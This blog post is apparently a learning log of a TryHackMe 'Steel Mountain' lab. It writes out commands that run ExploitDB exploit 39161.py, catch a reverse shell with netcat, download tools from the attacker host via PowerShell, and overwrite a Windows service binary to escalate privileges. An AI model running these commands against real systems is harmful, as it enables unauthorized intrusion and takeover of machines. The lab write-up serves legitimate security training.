---
title: 'TryHackMe: Complete Beginner'
date: 2021-11-08 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2021-11-08-tryhackme-complete-beginner.html
author: 100007
---

<h1 id="tryhackme-complete-beginner">TryHackMe: Complete Beginner</h1>
<p><strong>author:</strong> Nathan Acks<br />
<strong>date:</strong> 2021-11-08</p>
<h1 id="steel-mountain">Steel Mountain</h1>
<p>Things got busy yesterday and I had to push finishing this section off a day. The machine’s new IP address is 10.10.174.199.</p>
<h2 id="access-and-escalation-without-metasploit">Access and Escalation Without Metasploit</h2>
<p>The alternate exploit we’re going to run for this is located at /usr/share/exploitdb/exploits/windows/remote/39161.py on Kali Linux. To set this up, we’re going to use a quick-n-dirty Python web server containing a statically-compiled version of netcat. This needs to be running on port 80 for the exploit to work (don’t forget to punch a hole through the firewall for this!).</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>1
<span class="nb">cd </span>1
<span class="nb">cp</span> /usr/share/windows-binaries/nc.exe <span class="nb">.</span>
curl <span class="nt">-O</span> https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
<span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>
<p>Ready our listener in another terminal. Note that WinPEAS generates <em>a lot</em> of output, so we need to increase TMUX history buffer (<code class="language-plaintext highlighter-rouge">set -g history-limit 8192</code>) in order to be able to capture all of it. This needs to be set <em>before</em> creating the window that we’re going to catch our reverse shell in!</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4444
</code></pre></div></div>
<p>Copy, setup, and run the exploit!</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /usr/share/exploitdb/exploits/windows/remote/39161.py <span class="nb">.</span>
nano 39161.py <span class="c"># Change ip_addr and local_port</span>
python2 39161.py 10.10.174.199 8080
python2 39161.py 10.10.174.199 8080
</code></pre></div></div>
<p>Once we’re in (the exploit needs to be run twice to work), we need to grab and run winPEASx64.exe from our web server.</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"Invoke-WebRequest -Uri http://10.13.26.40/winPEASx64.exe -OutFile winPEASx64.exe"</span><span class="w">
</span><span class="o">.</span><span class="n">\winPEASx64.exe</span><span class="w">
</span></code></pre></div></div>
<p>Interestingly, while WinPEAS notes that ASCServie.exe is vulnerable to an overwrite, it looks like it misses the fact that the compromised user can restart it. That said, WinPEAS does display <em>a lot</em> more information than PowerUp, so it might be useful to run <em>both</em>…</p>
<p>Useful PowerShell commands:</p>
<ul>
<li><code class="language-plaintext highlighter-rouge">Get-Service</code> - list all services, or drill down on a particular service.</li>
<li><code class="language-plaintext highlighter-rouge">sc.exe stop $SERVICE</code>/<code class="language-plaintext highlighter-rouge">sc.exe start $SERVICE</code> - stop/start $SERVICE.</li>
</ul>
<p>Putting this all together, we can replicate yesterday’s compromise by:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"Invoke-WebRequest -Uri http://10.13.26.40/ASCService.exe -OutFile ASCService.exe"</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">AdvancedSystemCareService9</span><span class="w">
</span><span class="n">copy</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"</span><span class="w">
</span><span class="n">ASCService.exe.bak</span><span class="w">
</span><span class="nx">copy</span><span class="w"> </span><span class="nx">/Y</span><span class="w"> </span><span class="nx">ASCService.exe</span><span class="w">
</span><span class="s2">"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">AdvancedSystemCareService9</span><span class="w">
</span></code></pre></div></div>
<p>Where ASCService.exe is the same compromise as last time, and we again catch the reverse shell using:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4443
</code></pre></div></div>
<ul>
<li><a href="https://cardboard-iguana.com/log/2021-11-07-tryhackme-complete-beginner.html">2021-11-07 - TryHackMe: Complete Beginner</a></li>
</ul>